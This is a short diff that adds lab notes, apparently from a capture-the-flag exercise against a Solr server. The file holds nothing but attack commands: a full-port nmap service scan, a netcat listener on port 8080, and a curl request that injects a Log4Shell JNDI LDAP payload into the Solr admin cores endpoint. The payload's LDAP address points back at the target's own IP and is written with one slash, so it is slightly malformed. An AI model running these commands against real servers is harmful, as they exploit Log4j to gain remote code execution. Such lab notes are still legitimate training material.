@@ -1,0 +1,4 @@
+nmap -sV 10.10.109.254 -p- 
+
+nc -nlvp 8080
+curl 'http://10.10.109.254:8983/solr/admin/cores?foo=$\{jndi:ldap:/10.10.109.254:8080\}'
